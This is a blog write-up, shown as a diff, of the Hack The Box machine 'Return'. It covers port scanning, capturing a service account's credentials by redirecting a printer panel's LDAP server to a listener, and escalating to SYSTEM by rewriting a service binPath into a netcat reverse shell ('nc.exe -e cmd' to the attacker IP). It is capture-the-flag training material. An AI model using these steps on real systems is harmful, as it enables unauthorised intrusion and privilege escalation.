@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Return - Write up :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Return - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/return/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Return - Write up">
+<meta property="og:description" content="**HTB | Return - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/return/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Return.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-04 12:35:18 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/return/">Return - Write up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-04
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ejpt-like/">eJPT-like</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Return.png"
+    class="post-cover"
+    alt="Return - Write up"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Return</strong> is an easy Hack The Box machine managing a printing service.</p>
+<p>We will abuse a printer web admin panel to get credentials we can use with evil-winrm.</p>
+<p>Once inside, our user is in the <strong>Server Operators group</strong> so we will be able to modify, start and stop <strong>services</strong>. This way we&rsquo;ll get a shell as a <strong>nt authority\system</strong>.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>nmap</strong> we will find the opened ports and examinate them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -n -Pn 10.129.78.30 -oG allPorts
+</span></span></code></pre></div><p>We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.78.30
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,49671,49676,49677,49680,49683,49699,53544
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>There are a lot of opened ports, thankfully <strong>extractPorts</strong> uses <strong>xclip</strong> to copy all the ports to the clipboard so we can continue with the recon in a more comfortable way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,49671,49676,49677,49680,49683,49699,53544 
+</span></span><span style="display:flex;"><span>10.129.78.30 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-04 17:57 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.78.30
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: HTB Printer Admin Panel
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-07-04 23:16:08Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: <span style="color:#66d9ef">return</span>.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: <span style="color:#66d9ef">return</span>.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49683/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49699/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>53544/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 18m34s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2022-07-04T23:17:06
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 78.57 seconds
+</span></span></code></pre></div><p>This amount of ports might be a little intimidating but let&rsquo;s start with the basics.
+Port 80 is opened offering a <strong>HTTP</strong> server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whatweb http://10.129.78.30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://10.129.78.30 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.78.30<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>7.4.13<span style="color:#f92672">]</span>, 
+</span></span><span style="display:flex;"><span>Script, Title<span style="color:#f92672">[</span>HTB Printer Admin Panel<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/7.4.13<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We don&rsquo;t get anything interesting from <strong>whatweb</strong> like vulnerable versions of IIS so we now visit the website:</p>
+
+  <img src="/img/ret-1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It&rsquo;s a simple admin panel, inside <strong>Settings</strong> we find this:</p>
+
+  <img src="/img/ret-2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It looks like it&rsquo;s conecting to a server with some credentials.</p>
+<p>Before trying anything too complex we can try to manipulate the <strong>Server Address</strong> where the authentication is being done with our <strong>IP Address</strong>:</p>
+
+  <img src="/img/ret-3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::389
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:389
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.78.30.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.78.30:55399.
+</span></span><span style="display:flex;"><span>0*<span style="color:#e6db74">`</span>%return<span style="color:#ae81ff">\s</span>vc-printer
+</span></span><span style="display:flex;"><span>                      1edFg43012!!
+</span></span></code></pre></div><h1 id="intrusion"><strong><code>Intrusion</code></strong><a href="#intrusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We manage to redirect the connection to our listener and we get the credentials!</p>
+<p>With <strong>crackmapexec</strong> we can validate them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ crackmapexec winrm 10.129.78.30 -u <span style="color:#e6db74">&#39;svc-printer&#39;</span> -p <span style="color:#e6db74">&#39;1edFg43012!!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.129.78.30    <span style="color:#ae81ff">5985</span>   PRINTER          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:PRINTER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:return.local<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        10.129.78.30    <span style="color:#ae81ff">5985</span>   PRINTER          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://10.129.78.30:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       10.129.78.30    <span style="color:#ae81ff">5985</span>   PRINTER          <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#66d9ef">return</span>.local<span style="color:#ae81ff">\s</span>vc-printer:1edFg43012!! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The creds are valid and we also get <strong>(Pwn3ed!)</strong>, which means we can use <strong>evil-winrm</strong> to connect to <strong>Windows Remote Management System</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -i 10.129.78.30 -u <span style="color:#e6db74">&#39;svc-printer&#39;</span> -p <span style="color:#e6db74">&#39;1edFg43012!!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">\s</span>vc-printer
+</span></span></code></pre></div><p>We are in!</p>
+<p>Inside the Desktop we can find the first flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>8e07dd641f06c03b7***************
+</span></span></code></pre></div><h1 id="privilege-escalation"><strong><code>Privilege escalation</code></strong><a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now we have to figure out our way to <strong>root.txt</strong> so we start the basic enumeration until we find something interesting:</p>
+<ul>
+<li>Checking for privileges:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>esktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                         State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">===================================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain          Enabled
+</span></span><span style="display:flex;"><span>SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+</span></span><span style="display:flex;"><span>SeSystemtimePrivilege         Change the system time              Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories       Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories       Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system                Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+</span></span><span style="display:flex;"><span>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+</span></span><span style="display:flex;"><span>SeTimeZonePrivilege           Change the time zone                Enabled
+</span></span></code></pre></div><ul>
+<li>Checking for group memberships:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>esktop&gt; net user svc-printer
+</span></span><span style="display:flex;"><span>User name                    svc-printer
+</span></span><span style="display:flex;"><span>Full Name                    SVCPrinter
+</span></span><span style="display:flex;"><span>Comment                      Service Account <span style="color:#66d9ef">for</span> Printer
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country/region code          <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>Account expires              Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password last set            5/26/2021 1:15:13 AM
+</span></span><span style="display:flex;"><span>Password expires             Never
+</span></span><span style="display:flex;"><span>Password changeable          5/27/2021 1:15:13 AM
+</span></span><span style="display:flex;"><span>Password required            Yes
+</span></span><span style="display:flex;"><span>User may change password     Yes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Workstations allowed         All
+</span></span><span style="display:flex;"><span>Logon script
+</span></span><span style="display:flex;"><span>User profile
+</span></span><span style="display:flex;"><span>Home directory
+</span></span><span style="display:flex;"><span>Last logon                   5/26/2021 1:39:29 AM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Print Operators      *Remote Management Use
+</span></span><span style="display:flex;"><span>                             *Server Operators
+</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>We are part of <strong>Server Operators</strong> group, which means we have control over the services running inside the machine.</p>
+<p>If we manage to edit a service and make it execute a <strong>netcat</strong> to our listener we will get a shell as <strong>nt authority\system</strong>.</p>
+<p>So we are going to start by uploading the <strong>nc.exe</strong> to <strong>C:\Windows\Temp</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt; upload /home/logan/Desktop/Tools/Windows/nc.exe
+</span></span><span style="display:flex;"><span>Info: Uploading /home/logan/Desktop/Tools/Windows/nc.exe to C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>c.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: <span style="color:#ae81ff">37544</span> bytes of <span style="color:#ae81ff">37544</span> bytes copied
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span></code></pre></div><p>We can now start by listing the services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; services
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path                                                                                                                 Privileges Service
+</span></span><span style="display:flex;"><span>----                                                                                                                 ---------- -------
+</span></span><span style="display:flex;"><span>C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
+</span></span><span style="display:flex;"><span>\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796
+</span></span><span style="display:flex;"><span>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+</span></span><span style="display:flex;"><span>C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
+</span></span><span style="display:flex;"><span>&#34;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&#34;                                                False Sense
+</span></span><span style="display:flex;"><span>C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
+</span></span><span style="display:flex;"><span>&#34;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&#34;                                                     True VGAuthService
+</span></span><span style="display:flex;"><span>&#34;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&#34;                                                                        True VMTools
+</span></span><span style="display:flex;"><span>&#34;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&#34;                                             True WdNisSvc
+</span></span><span style="display:flex;"><span>&#34;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&#34;                                            True WinDefend
+</span></span><span style="display:flex;"><span>&#34;C:\Program Files\Windows Media Player\wmpnetwk.exe&#34;                                                                      False WMPNetworkSvc
+</span></span></code></pre></div><p>With <strong>sc.exe</strong> we can try to create or modify a service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt; sc.exe config VMTools binPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\Windows\Temp\nc.exe -e cmd 10.10.14.161 334&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> ChangeServiceConfig SUCCESS
+</span></span></code></pre></div><p>We managed to change the <strong>path</strong> to <strong>VMTools</strong>, so now once it&rsquo;s started it will execute the netcat.</p>
+<p>Now we proceed to restart this service after we have set up our listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt; sc.exe stop VMTools
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVICE_NAME: VMTools
+</span></span><span style="display:flex;"><span>        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS
+</span></span><span style="display:flex;"><span>        STATE              : <span style="color:#ae81ff">1</span>  STOPPED
+</span></span><span style="display:flex;"><span>        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        CHECKPOINT         : 0x0
+</span></span><span style="display:flex;"><span>        WAIT_HINT          : 0x0
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt; sc.exe start VMTools
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> StartService FAILED 1053:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The service did not respond to the start or control request in a timely fashion
+</span></span></code></pre></div><p>It looks like the service crashed but in the listener we get the connection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.78.30.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.78.30:52344.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.107<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span> whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>As usual, inside Administrator&rsquo;s desktop we find <strong>root.txt</strong>:</p>
